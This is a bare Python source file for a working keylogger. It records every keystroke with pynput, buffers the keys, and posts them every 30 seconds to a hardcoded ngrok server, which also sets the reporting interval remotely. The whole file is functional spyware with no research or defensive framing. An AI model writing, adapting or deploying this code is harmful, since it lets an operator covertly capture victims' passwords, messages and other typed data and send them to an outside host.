
from pynput import keyboard



import requests
import threading


import datetime



SERVER_URL = "https://semiconvergent-matias-unslanderously.ngrok-free.dev/"  
SEND_INTERVAL = 30

     
LOCK = threading.Lock()
LOG_BUFFER=[]


def send_buffer():
    global status
    global SEND_INTERVAL
    global LOG_BUFFER
    with LOCK:
        if LOG_BUFFER:
            try:
                pass
                res=requests.get(SERVER_URL+"/dashboard/diliverytime")
                # if res:
                #     status=res.json()['status']
                    # print(type(status),status)
                    # ttend(status)
                    # if status!="":
                    #     ttend(status)
                SEND_INTERVAL=int(res.json()["interval"])
            except:
                pass
            payload = {
                "timestamp": datetime.datetime.now().strftime("%D:%H:%M:%S"),
                "data": LOG_BUFFER.copy()
            }
            try:
                res=requests.post(SERVER_URL, json=payload)
                
                if res:
                    LOG_BUFFER.clear()
            except:
              pass
                
    threading.Timer(SEND_INTERVAL, send_buffer).start()


def on_press(key):
    k=""
    if key == keyboard.Key.space:
        k=" "
    elif key == keyboard.Key.backspace:
       try: LOG_BUFFER.pop()
       except:
           pass
    elif key == keyboard.Key.left or key == keyboard.Key.right or key == keyboard.Key.up or key == keyboard.Key.down:
        k=""
    else:
        try:
            k = key.char
        except AttributeError:
            k = str(key)

    with LOCK:
        if k!="":
            LOG_BUFFER.append(k)

send_buffer()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



